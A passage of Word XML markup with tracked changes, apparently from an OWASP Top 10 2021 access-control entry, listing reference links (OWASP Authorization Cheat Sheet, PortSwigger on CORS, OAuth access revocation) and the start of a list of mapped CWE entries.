      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [OWASP Cheat Sheet: </w:t>
      </w:r>
      <w:del w:id="507" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Access Control</w:delText>
        </w:r>
      </w:del>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="508" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Authorization</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="509" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="510"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511" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/Access_Control</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="512" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheets/Authorization</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>_Cheat_Sheet</w:t>
      </w:r>
      <w:ins w:id="513" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.html</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49AF08AE" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="514" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AECCF21" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="515" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="516" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>### External</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="49D30F9C" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="517" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="486EFBE2" w14:textId="410ABFB8" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="518" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="519" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="520" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>PortSwigger</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">: Exploiting CORS </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>misconfiguration](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="64C1EAD6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="521" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="522" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [OAuth: Revoking </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Access](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://www.oauth.com/oauth2-servers/listing-authorizations/revoking-access/) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7E5AF67F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="523" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02AF4F6A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="524" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="525" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## List of Mapped CWEs</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1A8650EE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="526" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DDB6F84" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="527" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://cwe.mitre.org/data/definitions/22.html)</w:t>
      </w:r>
      <w:ins w:id="528" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5651D625" w14:textId="5469CCD6" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="529" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="530" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="531" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-23: Relative Path </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Traversal](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/23.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1C913651" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="532" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="533" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-35: Path Traversal: '.../...//</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https://cwe.mitre.org/data/definitions/35.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="09DD71FC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="534" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="535" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-59: Improper Link Resolution Before File Access ('Link Following'</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https://cwe.mitre.org/data/definitions/59.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0F6A78A3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="536" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="537" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-200: Exposure of Sensitive Information to an Unauthorized </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Actor](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/200.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="02A2BF83" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="538" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="539" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-201: Exposure of Sensitive Information Through Sent </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Data](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/201.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3899C434" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="540" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="541" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-219: Storage of File with Sensitive Data Under Web </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Root](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/219.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7E08E0E5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="542" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="543" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-264: Permissions, Privileges, and Access Controls (should no longer be used</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https://cwe.mitre.org/data/definitions/264.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="35A8B883" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="544" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="545" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-275: Permission </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Issues](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/275.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="24BB553B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="546" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="547" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-276: Incorrect Default </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Permissions](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/276.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="41C17187" w14:textId="79E40328" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="548" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [CWE-284: Improper Access Control</w:t>
      </w:r>
      <w:del w:id="549" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> (Authorization)](</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="550" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>](</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://cwe.mitre.org/data/definitions/284.html)</w:t>
      </w:r>
      <w:ins w:id="551" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="352D319E" w14:textId="3B5A186E" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="552" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="553" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [CWE-285: Improper </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Authorization](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
